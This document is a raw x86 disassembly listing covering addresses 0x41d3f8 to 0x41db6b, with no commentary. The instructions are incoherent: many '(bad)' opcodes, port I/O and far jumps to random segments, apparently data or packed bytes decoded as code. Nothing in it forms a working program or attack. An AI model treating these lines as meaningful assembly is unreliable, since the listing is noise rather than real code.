  41d3f8:	sbb    eax,0x7d2aab79
  41d3fd:	jo     0x41d406
  41d3ff:	mov    ch,BYTE PTR [ebp-0x64]
  41d402:	sti    
  41d403:	and    edi,DWORD PTR [edi+0x6e]
  41d406:	outs   dx,DWORD PTR ds:[esi]
  41d407:	adc    eax,0x6dd8fbbc
  41d40d:	jns    0x41d3c7
  41d40f:	xchg   esp,eax
  41d410:	imul   edx
  41d412:	mov    DWORD PTR [ebp-0xb],esi
  41d415:	jle    0x41d432
  41d417:	jmp    0x41d498
  41d419:	fwait
  41d41a:	cmc    
  41d41b:	inc    esp
  41d41c:	sbb    al,0xa9
  41d41e:	out    dx,al
  41d41f:	frstor [ebx+0x5e]
  41d422:	iret   
  41d423:	push   ds
  41d424:	mov    al,ds:0xd92fcd93
  41d429:	inc    edx
  41d42a:	mov    bh,0xcd
  41d42c:	cmp    DWORD PTR [edx-0x3d],0xffffffe4
  41d430:	xlat   BYTE PTR ds:[ebx]
  41d431:	and    DWORD PTR [ebx],ebx
  41d433:	sub    DWORD PTR [edx],ebx
  41d435:	jns    0x41d3cd
  41d437:	push   esi
  41d438:	mov    eax,0x8b185d64
  41d43d:	jle    0x41d3fb
  41d43f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d440:	out    0x8d,al
  41d442:	mov    DWORD PTR [ebx+0x54],ebx
  41d445:	adc    al,0x23
  41d447:	das    
  41d448:	adc    DWORD PTR [ecx],esp
  41d44a:	out    dx,eax
  41d44b:	cld    
  41d44c:	ret    
  41d44d:	mov    al,ds:0xaaf23a0d
  41d452:	nop
  41d453:	test   al,0xa3
  41d455:	push   ds
  41d456:	fisubr WORD PTR [eax+0x47bbd53a]
  41d45c:	mov    edi,0x960028b3
  41d461:	lds    eax,FWORD PTR [eax]
  41d463:	bound  esi,QWORD PTR [ecx+0x9]
  41d466:	xor    edx,ecx
  41d468:	pop    esi
  41d469:	cmp    BYTE PTR [eax+0x2e],cl
  41d46c:	xchg   ebp,eax
  41d46d:	and    ebp,eax
  41d46f:	fcom   QWORD PTR [edx-0x793d245a]
  41d475:	in     al,dx
  41d476:	sub    ebp,DWORD PTR [esi]
  41d478:	imul   ebx,DWORD PTR [edi+ecx*2+0x9],0x3b
  41d47d:	frstpm(287 only) 
  41d47f:	hlt    
  41d480:	push   edi
  41d481:	sub    cl,bl
  41d483:	pop    edx
  41d484:	xchg   edi,eax
  41d485:	call   0x3158:0x8801931b
  41d48c:	out    0x27,al
  41d48e:	push   ds
  41d48f:	jg     0x41d4d2
  41d491:	fdivr  DWORD PTR [edx-0x42ef2221]
  41d497:	test   BYTE PTR [ebx+edi*4-0x51],ch
  41d49b:	adc    eax,0xedc440a5
  41d4a0:	repnz clc 
  41d4a2:	and    al,0xd3
  41d4a4:	sbb    ecx,DWORD PTR [ecx-0x50]
  41d4a7:	cmp    bl,ah
  41d4a9:	imul   ecx,ecx,0x5b
  41d4ac:	xlat   BYTE PTR ds:[ebx]
  41d4ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d4ae:	sub    esi,DWORD PTR [edx]
  41d4b0:	adc    al,0xe4
  41d4b2:	sbb    DWORD PTR [edx],eax
  41d4b4:	retf   0x18b7
  41d4b7:	mov    ebx,0x697d9481
  41d4bc:	sbb    bl,cl
  41d4be:	fwait
  41d4bf:	sub    al,bl
  41d4c1:	loope  0x41d4cf
  41d4c3:	stos   DWORD PTR es:[edi],eax
  41d4c4:	pop    ecx
  41d4c5:	jo     0x41d4af
  41d4c7:	scas   al,BYTE PTR es:[edi]
  41d4c8:	sbb    DWORD PTR [esi],esp
  41d4ca:	mov    cl,0xec
  41d4cc:	aam    0x37
  41d4ce:	mov    esi,DWORD PTR [esi-0x3a]
  41d4d1:	mul    ah
  41d4d3:	jne    0x41d504
  41d4d5:	ins    BYTE PTR es:[edi],dx
  41d4d6:	mov    al,0x14
  41d4d8:	push   cs
  41d4d9:	retf   0xaccb
  41d4dc:	jns    0x41d50d
  41d4de:	mov    dl,0xfb
  41d4e0:	shl    DWORD PTR [ecx+ecx*4+0x51],1
  41d4e4:	je     0x41d536
  41d4e6:	mov    al,0x1c
  41d4e8:	and    DWORD PTR [ecx],ebp
  41d4ea:	cmp    al,0x64
  41d4ec:	pop    ebp
  41d4ed:	outs   dx,DWORD PTR ds:[esi]
  41d4ee:	sub    eax,0xcba1f323
  41d4f3:	lock (bad) 
  41d4f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d4f6:	lahf   
  41d4f7:	cmp    dl,BYTE PTR [ebx+0x707343f3]
  41d4fd:	mov    eax,0x820194ba
  41d502:	lahf   
  41d503:	pop    edi
  41d504:	(bad)  
  41d505:	cmp    bl,dh
  41d507:	jecxz  0x41d57e
  41d509:	rol    DWORD PTR [esi+0x6ee2cff3],0x1
  41d510:	inc    esp
  41d511:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d512:	push   ebx
  41d513:	call   0x33a2dccc
  41d518:	push   es
  41d519:	mov    dl,0xcb
  41d51b:	ins    BYTE PTR es:[edi],dx
  41d51c:	xor    DWORD PTR [ecx+eiz*1],edi
  41d51f:	inc    edi
  41d520:	fwait
  41d521:	mov    eax,ds:0xb91bf4a2
  41d526:	add    ch,BYTE PTR [eax-0x40077e2e]
  41d52c:	jle    0x41d525
  41d52e:	fild   DWORD PTR [edi+0x5d]
  41d531:	cwde   
  41d532:	xchg   esi,eax
  41d533:	sbb    BYTE PTR [esi+0x4b59c674],dh
  41d539:	mov    bl,0x9d
  41d53b:	out    dx,al
  41d53c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d53d:	je     0x41d4c1
  41d53f:	mov    al,0x5a
  41d541:	sbb    al,0xbf
  41d543:	inc    esp
  41d544:	into   
  41d545:	loopne 0x41d529
  41d547:	xchg   esp,eax
  41d548:	int    0xbc
  41d54a:	sbb    edi,DWORD PTR [ebx+eax*2-0x72]
  41d54e:	xchg   ebx,eax
  41d54f:	lods   eax,DWORD PTR ds:[esi]
  41d550:	sbb    ebx,edi
  41d552:	repz (bad) 
  41d554:	lahf   
  41d555:	in     eax,dx
  41d556:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d557:	pop    esi
  41d558:	in     eax,0xa7
  41d55a:	mov    al,0xe6
  41d55c:	out    dx,al
  41d55d:	mov    ah,0x1d
  41d55f:	xor    DWORD PTR [ebp-0x38],0x1c
  41d563:	jmp    0xbb713cb2
  41d568:	(bad)
  41d56c:	dec    edi
  41d56d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d56e:	repz int3 
  41d570:	sbb    ebp,ebp
  41d572:	mov    esp,0x1c849ddb
  41d577:	mov    ds:0x8fd61c2e,al
  41d57c:	mov    ebx,0x92232b9c
  41d581:	xchg   edx,eax
  41d582:	cmp    BYTE PTR [ecx],cl
  41d584:	adc    ebx,esp
  41d586:	ret    
  41d587:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d588:	shl    BYTE PTR [ecx],1
  41d58a:	inc    edi
  41d58b:	add    eax,0x2cbb2e59
  41d590:	shl    ch,0x14
  41d593:	hlt    
  41d594:	push   ds
  41d595:	add    al,cl
  41d597:	push   esp
  41d598:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d599:	adc    BYTE PTR [ecx+0x27],ch
  41d59c:	jne    0x41d5aa
  41d59e:	mov    esp,0x60be87b
  41d5a3:	mov    WORD PTR [ecx-0xe],ss
  41d5a6:	(bad)  
  41d5a8:	and    cl,ch
  41d5aa:	mov    ebp,0x5c74d31d
  41d5af:	mov    ebx,0xd91ba6a5
  41d5b4:	sbb    al,0x2f
  41d5b6:	loop   0x41d569
  41d5b8:	jecxz  0x41d5f7
  41d5ba:	daa    
  41d5bb:	adc    edi,DWORD PTR [esi]
  41d5bd:	je     0x41d576
  41d5bf:	adc    al,0x90
  41d5c1:	or     cl,BYTE PTR [eax+0x8]
  41d5c4:	inc    ebp
  41d5c5:	(bad)  
  41d5c6:	xor    al,0xec
  41d5c8:	mov    esi,0x5baa5ff
  41d5cd:	dec    edx
  41d5ce:	jmp    0x65dbe97c
  41d5d3:	mov    cs,WORD PTR [edi]
  41d5d5:	popa   
  41d5d6:	dec    edi
  41d5d7:	jmp    0x5b673842
  41d5dc:	jmp    0x12a5:0xed738ba4
  41d5e3:	adc    ebx,DWORD PTR [ebx]
  41d5e5:	stc    
  41d5e6:	cld    
  41d5e7:	jecxz  0x41d5af
  41d5e9:	xor    al,0x94
  41d5eb:	pop    ss
  41d5ec:	pop    edx
  41d5ed:	nop
  41d5ee:	cmp    al,0xe4
  41d5f0:	sub    al,0x21
  41d5f2:	inc    eax
  41d5f3:	mov    al,ds:0xc4b3900a
  41d5f8:	and    bl,cl
  41d5fa:	cmp    eax,0x2757bd35
  41d5ff:	bound  esp,QWORD PTR [esp+edx*8+0x66dc7dcc]
  41d606:	or     ebp,DWORD PTR [edx*8-0x6a17208b]
  41d60d:	cmp    esp,DWORD PTR [edx-0x2ecb1ad4]
  41d613:	out    dx,al
  41d614:	pop    edx
  41d615:	repnz shl BYTE PTR [edx-0x783556cb],1
  41d61c:	jmp    edx
  41d61e:	loop   0x41d66e
  41d620:	sbb    ch,bh
  41d622:	ins    BYTE PTR es:[edi],dx
  41d623:	pop    esp
  41d624:	pop    ecx
  41d625:	inc    esp
  41d626:	xchg   ebp,eax
  41d627:	push   0x36a7a8db
  41d62c:	or     al,BYTE PTR [edx+0xc35355]
  41d632:	xchg   ebp,eax
  41d633:	loopne 0x41d66f
  41d635:	pop    edi
  41d636:	(bad)  
  41d637:	aam    0xfd
  41d639:	sub    ch,BYTE PTR [ebx]
  41d63b:	mov    DWORD PTR [ebp-0x251f0459],0x85ce7cf
  41d645:	ss xchg edi,eax
  41d647:	scas   al,BYTE PTR es:[edi]
  41d648:	out    dx,eax
  41d649:	push   ebx
  41d64a:	mov    esi,0x9bf66650
  41d64f:	xchg   BYTE PTR [ebp+0x49],bl
  41d652:	stos   DWORD PTR es:[edi],eax
  41d653:	(bad)  
  41d654:	frstor [edx+0x3859f084]
  41d65a:	in     eax,0xd6
  41d65c:	xor    al,0x16
  41d65e:	mov    cl,0xa4
  41d660:	mov    ds:0x35ad43b2,eax
  41d665:	pop    esp
  41d666:	mov    dl,dh
  41d668:	xchg   esi,eax
  41d669:	out    0xe9,al
  41d66b:	aaa    
  41d66c:	sbb    eax,0x9c81a819
  41d671:	into   
  41d672:	popf   
  41d673:	cwde   
  41d674:	es xchg ecx,eax
  41d676:	sbb    eax,0x6b9c649a
  41d67b:	mov    bh,0x89
  41d67d:	nop
  41d67e:	pusha  
  41d67f:	push   eax
  41d680:	push   ds
  41d681:	jns    0x41d670
  41d683:	or     edx,DWORD PTR [ebp+0x6b]
  41d686:	jb     0x41d62a
  41d688:	fldcw  WORD PTR [eax+0x58926cfb]
  41d68e:	inc    DWORD PTR [edi+esi*1+0x33]
  41d692:	and    al,BYTE PTR [ebx+0x29]
  41d695:	adc    ah,BYTE PTR [ecx-0x435660ea]
  41d69b:	in     al,dx
  41d69c:	cld    
  41d69d:	or     DWORD PTR [ecx+ecx*4-0x73e7e820],ebp
  41d6a4:	pop    ecx
  41d6a5:	xor    bh,BYTE PTR [esi]
  41d6a7:	test   ebx,0xe1f3d841
  41d6ad:	pop    edx
  41d6ae:	sbb    eax,0x1c2d1913
  41d6b3:	xchg   BYTE PTR [edi+eax*1-0x59],dl
  41d6b7:	dec    ebx
  41d6b8:	inc    ebp
  41d6b9:	dec    ebx
  41d6ba:	nop
  41d6bb:	sti    
  41d6bc:	loope  0x41d6ea
  41d6be:	ret    
  41d6bf:	ins    BYTE PTR es:[edi],dx
  41d6c0:	and    esi,ebx
  41d6c2:	sub    ecx,0xd8327c75
  41d6c8:	mov    ah,0xf1
  41d6ca:	in     eax,dx
  41d6cb:	push   esp
  41d6cc:	dec    esi
  41d6cd:	pushf  
  41d6ce:	aaa    
  41d6cf:	aad    0x16
  41d6d1:	out    dx,al
  41d6d2:	mov    edi,0xe2694c64
  41d6d7:	fmul   DWORD PTR [ebx-0x21]
  41d6da:	mov    dl,0xfb
  41d6dc:	int    0x40
  41d6de:	(bad)  
  41d6e0:	mov    ch,0x5c
  41d6e2:	sbb    esi,esp
  41d6e4:	ret    0x31d9
  41d6e7:	cmp    esp,DWORD PTR [edx]
  41d6e9:	leave  
  41d6ea:	mov    al,ah
  41d6ec:	mov    ch,0xbf
  41d6ee:	adc    eax,0x9ba61605
  41d6f3:	sti    
  41d6f4:	jp     0x41d766
  41d6f6:	xchg   BYTE PTR [ecx-0x51],cl
  41d6f9:	mov    ebx,0xa922109b
  41d6fe:	loopne 0x41d6cb
  41d700:	and    al,0x3d
  41d702:	in     al,0x93
  41d704:	add    DWORD PTR [ebx+ebp*2+0x2a9f70f4],esp
  41d70b:	inc    ebp
  41d70c:	pop    es
  41d70d:	addr16 push esi
  41d70f:	icebp  
  41d710:	cwde   
  41d711:	mov    ds:0xa74284d2,eax
  41d716:	mov    edi,0x5b9f4d5f
  41d71b:	dec    edx
  41d71c:	pushf  
  41d71d:	in     al,0x88
  41d71f:	xchg   edi,eax
  41d720:	or     edi,esi
  41d722:	xor    edx,esi
  41d724:	mov    edx,0xbb74b6fb
  41d729:	inc    ecx
  41d72a:	mov    edx,0x57b1dbdf
  41d72f:	je     0x41d728
  41d731:	gs mov bl,0x94
  41d734:	lds    ecx,FWORD PTR [esi-0x7ccfbf2b]
  41d73a:	aaa    
  41d73b:	push   edi
  41d73c:	or     DWORD PTR [edx-0x43],edi
  41d73f:	aas    
  41d740:	mov    al,ds:0x92e6ad9b
  41d745:	fs inc ecx
  41d747:	push   ecx
  41d748:	and    eax,0x86e5d1f0
  41d74d:	dec    ecx
  41d74e:	push   esi
  41d74f:	outs   dx,BYTE PTR ds:[esi]
  41d750:	mov    ds:0x7a63d5e,al
  41d755:	cwde   
  41d756:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d757:	shl    eax,1
  41d759:	stos   DWORD PTR es:[edi],eax
  41d75a:	mov    al,0x4
  41d75c:	pop    ecx
  41d75d:	lahf   
  41d75e:	jnp    0x41d79d
  41d760:	aam    0xa9
  41d762:	dec    eax
  41d763:	es dec eax
  41d765:	cmp    cl,BYTE PTR [ebp+0x31]
  41d768:	shr    DWORD PTR [edx+edi*1-0x54],1
  41d76c:	mov    ebp,0xd1f1107b
  41d771:	xchg   esi,eax
  41d772:	sbb    ch,ah
  41d774:	jne    0x41d77a
  41d776:	es lock das 
  41d779:	fsubr  st,st(3)
  41d77b:	jmp    0x41d797
  41d77d:	leave  
  41d77e:	es mov bl,0xb0
  41d781:	rol    BYTE PTR [ecx+0x27],1
  41d784:	xor    eax,0xd7bcaba3
  41d789:	jno    0x41d7de
  41d78b:	imul   ecx,DWORD PTR [eax-0x1f],0x3d
  41d78f:	fcom   QWORD PTR [ebx]
  41d791:	xor    eax,0xebecf4b4
  41d796:	lock jecxz 0x41d73e
  41d799:	push   es
  41d79a:	leave  
  41d79b:	jns    0x41d762
  41d79d:	mov    bh,0xee
  41d79f:	out    0x8e,al
  41d7a1:	loop   0x41d773
  41d7a3:	ins    BYTE PTR es:[edi],dx
  41d7a4:	(bad)  
  41d7a5:	pop    esp
  41d7a6:	sub    esp,DWORD PTR [esi]
  41d7a8:	adc    eax,0x6b255d31
  41d7ad:	ss mov bh,0x74
  41d7b0:	repnz (bad) 
  41d7b2:	cli    
  41d7b3:	call   DWORD PTR ds:0x94f3dfb8
  41d7b9:	lds    ebx,FWORD PTR [ebx+edx*1+0x1e8e9919]
  41d7c0:	jb     0x41d7af
  41d7c2:	es hlt 
  41d7c4:	ds popf 
  41d7c6:	jnp    0x41d7f2
  41d7c8:	add    DWORD PTR ds:0x10145d1f,edi
  41d7ce:	lahf   
  41d7cf:	or     al,0x77
  41d7d1:	cs sti 
  41d7d3:	les    ebx,FWORD PTR [edx]
  41d7d5:	adc    DWORD PTR ds:0xb9e64c5,edx
  41d7db:	and    BYTE PTR [esi+0x5ec9b899],cl
  41d7e1:	pop    ebx
  41d7e2:	xchg   BYTE PTR [edi+0x7e],ah
  41d7e5:	jl     0x41d79d
  41d7e7:	inc    esp
  41d7e8:	jecxz  0x41d821
  41d7ea:	retf   0xc432
  41d7ed:	push   ds
  41d7ee:	fst    QWORD PTR [edx-0x38]
  41d7f1:	sahf   
  41d7f2:	dec    edi
  41d7f3:	pop    edx
  41d7f4:	jmp    0xc101:0xdde839c2
  41d7fb:	in     al,dx
  41d7fc:	es cs pop esp
  41d7ff:	or     DWORD PTR [edi-0x8b53ad3],0x69
  41d806:	ret    0xa364
  41d809:	adc    eax,0xd5c1740a
  41d80e:	mov    esp,0xa3a697de
  41d813:	clc    
  41d814:	mov    ebp,0xacd01d5f
  41d819:	adc    edi,esp
  41d81b:	sbb    bl,0x7d
  41d81e:	and    al,0xae
  41d820:	mov    dl,0x54
  41d822:	fucomip st,st(7)
  41d824:	and    al,0x69
  41d826:	mov    ah,0x8f
  41d828:	loopne 0x41d875
  41d82a:	nop
  41d82b:	test   DWORD PTR [edx-0x59],ebx
  41d82e:	sbb    esi,ecx
  41d830:	lds    esp,FWORD PTR [ecx+0x35]
  41d833:	inc    ebx
  41d834:	test   DWORD PTR [edi-0x8],esp
  41d837:	leave  
  41d838:	mov    dl,0xd
  41d83a:	lock and al,0x20
  41d83d:	loope  0x41d7db
  41d83f:	leave  
  41d840:	mov    bl,0x9e
  41d842:	imul   ecx,esi,0xffffffb2
  41d845:	xchg   esi,eax
  41d846:	fsub   DWORD PTR [eax+0x4b7fef12]
  41d84c:	into   
  41d84d:	ror    bl,1
  41d84f:	je     0x41d845
  41d851:	rcl    BYTE PTR [eax+0x1d],1
  41d854:	jle    0x41d88f
  41d856:	mov    al,0xcc
  41d858:	mov    al,ds:0x44b326a3
  41d85d:	mov    cl,0xa1
  41d85f:	gs push 0xffffff8d
  41d862:	lods   eax,DWORD PTR ds:[esi]
  41d863:	pop    ss
  41d864:	bound  esp,QWORD PTR [esi]
  41d866:	inc    edx
  41d867:	ins    BYTE PTR es:[edi],dx
  41d868:	inc    ebp
  41d869:	sub    BYTE PTR [eax+esi*8-0x31be596d],dl
  41d870:	xchg   ebp,eax
  41d871:	sbb    DWORD PTR [ebx],esi
  41d873:	adc    BYTE PTR [ecx-0x3274df74],0x16
  41d87a:	mov    esi,0x5ba34d17
  41d87f:	test   eax,0x1bf2512c
  41d884:	mov    cl,0xa5
  41d886:	sbb    al,0x62
  41d888:	call   0x9a669134
  41d88d:	inc    ecx
  41d88e:	aam    0x7a
  41d890:	push   es
  41d891:	retf   0x5a0c
  41d894:	out    dx,eax
  41d895:	test   al,0x51
  41d897:	pop    es
  41d898:	inc    ebp
  41d899:	cld    
  41d89a:	xchg   esi,eax
  41d89b:	pop    esp
  41d89c:	lahf   
  41d89d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d89e:	mov    edx,0xf2da3a4
  41d8a3:	adc    esi,ebp
  41d8a5:	jnp    0x41d82b
  41d8a7:	jmp    0x41d8aa
  41d8a9:	push   esi
  41d8aa:	aas    
  41d8ab:	add    DWORD PTR [edx],ebx
  41d8ad:	jmp    0x1070cadc
  41d8b2:	mov    al,ds:0x6ba7ff7d
  41d8b7:	scas   eax,DWORD PTR es:[edi]
  41d8b8:	sti    
  41d8b9:	enter  0x64c9,0x9f
  41d8bd:	adc    ecx,DWORD PTR [ecx+0x3d4d99b6]
  41d8c3:	xchg   ebx,eax
  41d8c4:	push   esi
  41d8c5:	xchg   esi,eax
  41d8c6:	add    ebx,DWORD PTR [edi]
  41d8c8:	dec    ebx
  41d8c9:	and    BYTE PTR [ebx],bl
  41d8cb:	lea    edx,[eax+0x4a]
  41d8ce:	in     al,dx
  41d8cf:	enter  0x3f8c,0x63
  41d8d3:	mov    bh,0x7d
  41d8d5:	pop    edi
  41d8d6:	mov    ah,0x1c
  41d8d8:	and    DWORD PTR [ecx-0x68e515e],ebx
  41d8de:	cwde   
  41d8df:	xchg   ecx,eax
  41d8e0:	rcr    DWORD PTR [esi-0x6cc33785],cl
  41d8e6:	inc    edi
  41d8e7:	adc    DWORD PTR [edx-0x1d430d44],ebp
  41d8ed:	sahf   
  41d8ee:	mov    bl,0x14
  41d8f0:	and    eax,0xe5d09216
  41d8f5:	mov    BYTE PTR ds:0x13d19f06,ch
  41d8fb:	inc    edx
  41d8fc:	mov    ch,0x7b
  41d8fe:	scas   eax,DWORD PTR es:[edi]
  41d8ff:	aad    0x73
  41d901:	test   al,0x30
  41d903:	xchg   esp,eax
  41d904:	(bad)  
  41d905:	mov    ds:0x547374b8,eax
  41d90a:	dec    esp
  41d90b:	mov    ebp,0xe8297db5
  41d910:	les    ebx,FWORD PTR [esi-0x63]
  41d913:	lahf   
  41d914:	cmp    cl,0xe7
  41d917:	inc    eax
  41d918:	add    ebx,ebp
  41d91a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d91b:	mul    DWORD PTR [esi-0x17a1a335]
  41d921:	sahf   
  41d922:	nop
  41d923:	ret    0xd563
  41d926:	inc    ecx
  41d927:	jle    0x41d8ec
  41d929:	pop    ds
  41d92a:	mov    esp,0x14d80c44
  41d92f:	sti    
  41d930:	test   DWORD PTR [esi-0x32b614bc],esi
  41d936:	push   ebp
  41d937:	or     DWORD PTR [edi],ebx
  41d939:	dec    ecx
  41d93a:	pop    esp
  41d93b:	xchg   DWORD PTR [esi+0x2cfa4d67],esp
  41d941:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d942:	or     ecx,DWORD PTR [esi-0x48c0ac88]
  41d948:	std    
  41d949:	mov    eax,0x3a8e3ad7
  41d94e:	mov    cl,0xf4
  41d950:	stos   WORD PTR es:[edi],ax
  41d952:	xor    edi,DWORD PTR [eax]
  41d954:	inc    ebp
  41d955:	mov    cl,0xe9
  41d957:	out    dx,eax
  41d958:	dec    ebx
  41d959:	push   cs
  41d95a:	(bad)  
  41d95b:	and    bl,BYTE PTR ds:[ecx-0x41]
  41d95f:	stc    
  41d960:	pusha  
  41d961:	fbstp  TBYTE PTR [ebx]
  41d963:	leave  
  41d964:	sbb    BYTE PTR [esi-0x3888f845],0x40
  41d96b:	sub    ebx,DWORD PTR ds:0xd3d705f7
  41d971:	mov    al,ds:0x6eeea4b6
  41d976:	inc    ebx
  41d977:	stos   BYTE PTR es:[edi],al
  41d978:	aad    0x7c
  41d97a:	fucom  st(6)
  41d97c:	jb     0x41d9f2
  41d97e:	dec    esp
  41d97f:	fist   DWORD PTR [ecx+0x1e27d839]
  41d985:	daa    
  41d986:	jecxz  0x41d9e7
  41d988:	xchg   esp,eax
  41d989:	aaa    
  41d98a:	mov    bl,0x8d
  41d98c:	xchg   ebp,eax
  41d98d:	ret    
  41d98e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d98f:	in     al,dx
  41d990:	leave  
  41d991:	test   al,0xad
  41d993:	shl    BYTE PTR [eax+esi*2+0xcd30e3c],0xb7
  41d99b:	hlt    
  41d99c:	add    DWORD PTR [edx+0x3],ecx
  41d99f:	sbb    esi,DWORD PTR [ebp-0x2814ac9d]
  41d9a5:	arpl   WORD PTR [eax+0x245af773],di
  41d9ab:	loop   0x41d9ec
  41d9ad:	mov    bh,BYTE PTR [esi+edx*2+0x2619e91c]
  41d9b4:	mov    al,0x6f
  41d9b6:	ss dec esi
  41d9b8:	push   ebp
  41d9b9:	test   BYTE PTR [ecx],dh
  41d9bb:	jmp    0x41da25
  41d9bd:	pusha  
  41d9be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d9bf:	stos   BYTE PTR es:[edi],al
  41d9c0:	pop    ds
  41d9c1:	imul   ebx,DWORD PTR [edi-0x3b],0x15066430
  41d9c8:	imul   esp,DWORD PTR [edx-0x73b94f05],0xffffffe9
  41d9cf:	shl    ah,cl
  41d9d1:	test   al,0x45
  41d9d3:	stc    
  41d9d4:	and    ebx,DWORD PTR [ecx-0x794f0438]
  41d9da:	addr16 mov edi,0xda7c8857
  41d9e0:	mov    edx,0x14a07dac
  41d9e5:	out    0xbf,eax
  41d9e7:	test   BYTE PTR [ecx],ch
  41d9e9:	sub    esp,esp
  41d9eb:	xchg   edi,eax
  41d9ec:	and    BYTE PTR ds:0xf02027d8,dl
  41d9f2:	sub    ecx,esi
  41d9f4:	add    BYTE PTR gs:[eax-0x3570eb16],0x19
  41d9fc:	and    ch,BYTE PTR [eax+0x1e41e138]
  41da02:	out    dx,al
  41da03:	xor    al,0x5e
  41da05:	daa    
  41da06:	sbb    ecx,DWORD PTR [ecx+0x7d7abc2f]
  41da0c:	add    eax,0x22f0fda0
  41da11:	inc    ecx
  41da12:	and    BYTE PTR [edx-0x56],0x6c
  41da16:	pushf  
  41da17:	adc    eax,0x9ffc45b6
  41da1c:	pop    ebp
  41da1d:	push   0xa238ebe9
  41da22:	pop    ebx
  41da23:	les    ecx,FWORD PTR ds:0xe9270707
  41da29:	xchg   edi,eax
  41da2a:	add    BYTE PTR [ecx],ah
  41da2c:	mov    ecx,0x79f4b0f2
  41da31:	or     cl,BYTE PTR [ebp+0x3d]
  41da34:	jp     0x41da38
  41da36:	mov    esi,DWORD PTR [eax+0x452c0275]
  41da3c:	ret    
  41da3d:	jp     0x41da9f
  41da3f:	cli    
  41da40:	dec    ebx
  41da41:	inc    esp
  41da42:	sub    edx,0xb4b34c17
  41da48:	add    dh,BYTE PTR [ebp+eax*2-0xf64ea49]
  41da4f:	in     eax,0x12
  41da51:	jmp    0x484:0x9924db75
  41da58:	les    di,DWORD PTR [esi]
  41da5b:	mov    DWORD PTR [bp-0x465],esp
  41da60:	mov    esi,0x78765029
  41da65:	arpl   WORD PTR [ecx],dx
  41da67:	lods   eax,DWORD PTR ds:[esi]
  41da68:	mov    bl,0xd9
  41da6a:	in     eax,0x67
  41da6c:	jae    0x41da8a
  41da6e:	iret   
  41da6f:	ins    BYTE PTR es:[edi],dx
  41da70:	adc    eax,0x8ef0c1f
  41da75:	ret    0xf5ac
  41da78:	and    eax,0x46b7bd49
  41da7d:	xchg   ebp,eax
  41da7e:	adc    bh,BYTE PTR [edi]
  41da80:	jg     0x41da1c
  41da82:	sbb    ecx,edx
  41da84:	cld    
  41da85:	mov    ah,0x42
  41da87:	sar    BYTE PTR [edi],cl
  41da89:	das    
  41da8a:	clc    
  41da8b:	jne    0x41da7f
  41da8d:	test   al,0x3b
  41da8f:	jmp    0x996e:0x65611d5a
  41da96:	jmp    0x41da87
  41da98:	leave  
  41da99:	loopne 0x41db01
  41da9b:	stos   BYTE PTR es:[edi],al
  41da9c:	imul   BYTE PTR [ecx+0x42dea7c8]
  41daa2:	ret    0x9334
  41daa5:	ss out 0x1c,al
  41daa8:	inc    eax
  41daa9:	jns    0x41db28
  41daab:	push   ecx
  41daac:	ret    0xbfa1
  41daaf:	fnstcw WORD PTR [eax]
  41dab1:	in     al,0x43
  41dab3:	xchg   esp,eax
  41dab4:	push   esi
  41dab5:	mov    bh,0x30
  41dab7:	jae    0x41db1d
  41dab9:	push   0xffffffb2
  41dabb:	inc    esp
  41dabc:	ds dec eax
  41dabe:	(bad)
  41dac2:	(bad)  
  41dac3:	mov    esi,0x46b71917
  41dac8:	ds das 
  41daca:	ja     0x41da6e
  41dacc:	mov    cl,cl
  41dace:	sbb    al,0xbb
  41dad0:	xor    ah,al
  41dad2:	je     0x41da71
  41dad4:	ret    0xbe1b
  41dad7:	scas   al,BYTE PTR es:[edi]
  41dad8:	adc    eax,0x36f29cff
  41dadd:	or     eax,0x2917d80f
  41dae2:	push   ebp
  41dae3:	adc    esi,DWORD PTR [ebx]
  41dae5:	and    ebx,ebp
  41dae7:	inc    eax
  41dae8:	push   eax
  41dae9:	jle    0x41da8e
  41daeb:	jge    0x41db42
  41daed:	and    BYTE PTR [ebx],dh
  41daef:	jmp    0x41dab1
  41daf1:	xor    dh,BYTE PTR [edi-0x6626de25]
  41daf7:	dec    BYTE PTR [esi+0x20078d5f]
  41dafd:	test   al,0xcb
  41daff:	retf   0x7bb9
  41db02:	mov    bl,bh
  41db04:	stos   DWORD PTR es:[edi],eax
  41db05:	push   eax
  41db06:	(bad)  
  41db07:	sub    DWORD PTR [edx-0x434b4fe1],ebx
  41db0d:	mov    edi,0x162d7801
  41db12:	cmp    al,0xa1
  41db14:	jecxz  0x41da9e
  41db16:	pop    ss
  41db17:	inc    ebx
  41db18:	clc    
  41db19:	mov    ds:0x6916f40e,al
  41db1e:	add    DWORD PTR [ebx+0xd],0x53
  41db22:	ret    0x5aff
  41db25:	and    eax,0x6c05a68b
  41db2a:	in     al,dx
  41db2b:	jmp    0x41db81
  41db2d:	cmp    al,0x81
  41db2f:	cmp    DWORD PTR [edi-0x47],eax
  41db32:	xchg   ecx,eax
  41db33:	xchg   ebp,eax
  41db34:	(bad)  
  41db35:	xchg   DWORD PTR [edi-0xf],esp
  41db38:	in     eax,dx
  41db39:	xor    BYTE PTR [ecx],cl
  41db3b:	lock add eax,0x29ec94ed
  41db41:	sbb    cl,bl
  41db43:	mov    DWORD PTR [edi],edx
  41db45:	jmp    0x31d359f2
  41db4a:	mov    eax,0xc332b085
  41db4f:	inc    ebp
  41db50:	xchg   ebp,eax
  41db51:	push   esp
  41db52:	jbe    0x41db3b
  41db54:	mov    eax,ds:0x1c1a124a
  41db59:	pop    ecx
  41db5a:	and    DWORD PTR [eax+0x4e],ecx
  41db5d:	adc    eax,0x9cf2ceb2
  41db62:	sub    esi,eax
  41db64:	jmp    0xf85c4906
  41db69:	jbe    0x41db54
  41db6b:	sbb    ah,BYTE PTR [ebx+eax*1-0x41]
